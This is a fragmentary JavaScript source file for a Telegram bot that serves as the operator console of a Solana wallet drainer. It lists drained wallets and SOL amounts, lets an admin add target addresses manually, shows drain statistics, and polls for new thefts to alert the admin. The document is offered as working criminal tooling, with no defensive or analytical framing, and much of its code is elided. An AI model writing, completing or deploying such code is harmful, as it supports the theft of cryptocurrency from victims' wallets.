// ==========================================
// 🩸 SOLANA DRAINER TELEGRAM BOT
// Displays drained wallets in FedFanta style
// Requires API key (unless you're @Kaxobrixks)
// ==========================================
...
const CFG = {
    ...
    // Where to read drained addresses from
    ...
    POLL_INTERVAL_MS: 15000,                   // how often to poll for new drains
};
...
// In-memory store of recent drains (for 'poll' mode)
...
function formatDrainMessage(entry, index) {
    ...
    if (entry.solDrained > 0) {
        msg += `\n💸 *Drained:* ${entry.solDrained.toFixed(4)} SOL\n`;
    }
...
bot.onText(/\/start/, (msg) => {
    ...
    if (!requiresKey(chatId)) {
        ...
        bot.sendMessage(chatId, '🩸 *FedFanta Drainer Bot*\n\n' +
            '✅ Authorized as Admin\n\n' +
            'Available commands:\n' +
            '/drains — View recent drains\n' +
            '/drain <address> — Add a wallet manually\n' +
            '/stats — Drain statistics\n' +
            '/clear — Clear all drains\n' +
    ...
    // Ask for key
    bot.sendMessage(chatId, '🔐 *Drainer Bot*\n\nEnter your API key to continue:', {
        parse_mode: 'Markdown'
    });
});
    ...
    switch (command) {
        ...
        case '/drains': {
            if (drainedWallets.length === 0) {
                bot.sendMessage(chatId, '📭 No drains recorded yet.');
                return;
            }
        ...
        case '/drain': {
            if (parts[1]) {
                if (addManualDrain(chatId, parts[1])) {
                    bot.sendMessage(chatId, `✅ Added \`${parts[1]}\` to drain list.`, {
                        parse_mode: 'Markdown'
                    });
        ...
        case '/clear': {
            ...
            bot.sendMessage(chatId, '🗑️ All drains cleared.');
            break;
        }
...
}  // <-- FIXED: closed handleAuthorized (not a callback, so no closing paren)
...
if (CFG.DATA_SOURCE === 'poll') {
    setInterval(() => {
        ...
        if (drainedWallets.length > before) {
            const newDrains = drainedWallets.length - before;
            console.log(`[Bot] Found ${newDrains} new drain(s). Total: ${drainedWallets.length}`);
            ...
            if (latest) {
                try {
                    bot.sendMessage(CFG.ADMIN_CHAT_ID,
                        ...
                        `SOL Drained: ${latest.solDrained.toFixed(4)}\n` +
    ...
    setInterval(() => {
        ...
        loadFromFile();
        if (drainedWallets.length > before) {
            console.log(`[Bot] Loaded ${drainedWallets.length - before} new drain(s) from file.`);
        }
    }, 10000);
}
...
// 🚀 BOOT
// ==========================================
console.log('[Bot] 🩸 Drainer Telegram Bot started');
